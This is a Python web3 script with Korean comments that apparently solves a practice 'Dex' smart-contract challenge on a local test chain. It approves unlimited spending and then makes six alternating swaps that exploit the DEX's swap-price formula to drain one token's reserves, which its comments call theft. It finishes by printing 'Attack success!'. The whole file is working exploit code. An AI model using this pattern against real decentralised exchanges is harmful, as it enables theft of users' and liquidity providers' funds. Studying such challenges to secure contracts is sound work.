from web3 import Web3
import os
import solcx
from dotenv import load_dotenv

load_dotenv(dotenv_path="../.env")

# 문제에서 사용하는 각종 정보 추출
RPC_URL = os.getenv("WEB3_PROVIDER_URI")
CONTRACT_PATH = "./contracts/Dex.sol"
ABI = None

USER_PRIV_KEY = os.getenv("USER_PRIVATE_KEY")
USER_ADDRESS = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
CONTRACT_ADDRESS = "0x6fd9a6940a9Dc7574C7377855991ddfFf7F27718"

# Solidity 컴파일러 버전 설치 및 설정
try:
    solcx.install_solc('0.8.20')
    print("solc v0.8.20 installed successfully.")
except solcx.exceptions.SolcNotInstalled:
    print("Could not install solc v0.8.20. Please check your system.")
    exit(1)

# 사용할 solc 버전 지정
solcx.set_solc_version('0.8.20')

# Dex.sol 파일 읽기
with open(CONTRACT_PATH, 'r') as f:
    source_code = f.read()

# Dex.sol 컴파일
compiled_sol = solcx.compile_source(
    source_code,
    output_values=['abi'],
    solc_version='0.8.20'
)

# ABI 정보 추출
contract_name = "Dex"
contract_key = f"<stdin>:{contract_name}"

if contract_key not in compiled_sol:
    print(f"Error: Contract '{contract_name}' not found in compiled output.")
    print("Available keys:", list(compiled_sol.keys()))
else:
    # 해당 컨트랙트의 인터페이스(ABI, bytecode 등)를 가져옵니다.
    contract_interface = compiled_sol[contract_key]
    
    # ABI를 추출합니다.
    ABI = contract_interface['abi']

# 스마트 컨트랙트 연결
web3 = Web3(Web3.HTTPProvider(RPC_URL))

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

# TOKEN1, TOKEN2 정보 추출
TOKEN1_ADDRESS = contract.functions.token1().call()
TOKEN2_ADDRESS = contract.functions.token2().call()

# 최대 거래량 Approve
tx = contract.functions.approve(CONTRACT_ADDRESS, 2 ** 256 - 1).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

# 1번째 SWAP (TOKEN1 -> TOKEN2)
TOKEN1_AMOUNT = contract.functions.balanceOf(TOKEN1_ADDRESS, USER_ADDRESS).call()

# TOKEN1 -> TOKEN2
tx = contract.functions.swap(TOKEN1_ADDRESS, TOKEN2_ADDRESS, TOKEN1_AMOUNT).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

# 2번째 SWAP (TOKEN2 -> TOKEN1)
TOKEN2_AMOUNT = contract.functions.balanceOf(TOKEN2_ADDRESS, USER_ADDRESS).call()

# TOKEN2 -> TOKEN1
tx = contract.functions.swap(TOKEN2_ADDRESS, TOKEN1_ADDRESS, TOKEN2_AMOUNT).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

# 3번째 SWAP (TOKEN1 -> TOKEN2)
TOKEN1_AMOUNT = contract.functions.balanceOf(TOKEN1_ADDRESS, USER_ADDRESS).call()

# TOKEN1 -> TOKEN2
tx = contract.functions.swap(TOKEN1_ADDRESS, TOKEN2_ADDRESS, TOKEN1_AMOUNT).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

# 4번째 SWAP (TOKEN2 -> TOKEN1)
TOKEN2_AMOUNT = contract.functions.balanceOf(TOKEN2_ADDRESS, USER_ADDRESS).call()

# TOKEN2 -> TOKEN1
tx = contract.functions.swap(TOKEN2_ADDRESS, TOKEN1_ADDRESS, TOKEN2_AMOUNT).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

# 5번째 SWAP (TOKEN1 -> TOKEN2)
TOKEN1_AMOUNT = contract.functions.balanceOf(TOKEN1_ADDRESS, USER_ADDRESS).call()

# TOKEN1 -> TOKEN2
tx = contract.functions.swap(TOKEN1_ADDRESS, TOKEN2_ADDRESS, TOKEN1_AMOUNT).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

# 6번째 SWAP (TOKEN2 -> TOKEN1)
# 마지막으로 컨트랙트가 보유 중인 TOKEN2 수량 전액 스왑하여 탈취
TOKEN2_AMOUNT = contract.functions.balanceOf(TOKEN2_ADDRESS, CONTRACT_ADDRESS).call()

# TOKEN2 -> TOKEN1
tx = contract.functions.swap(TOKEN2_ADDRESS, TOKEN1_ADDRESS, TOKEN2_AMOUNT).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

TARGET_TOKEN1_AMOUNT = contract.functions.balanceOf(TOKEN1_ADDRESS, CONTRACT_ADDRESS).call()
TARGET_TOKEN2_AMOUNT = contract.functions.balanceOf(TOKEN2_ADDRESS, CONTRACT_ADDRESS).call()

print(f"Contracts token1 amount:{TARGET_TOKEN1_AMOUNT}, token2 amount:{TARGET_TOKEN2_AMOUNT}")

if (TARGET_TOKEN1_AMOUNT == 0 or TARGET_TOKEN2_AMOUNT == 0):
    print("Attack success!")
else:
    print("Attack failed...")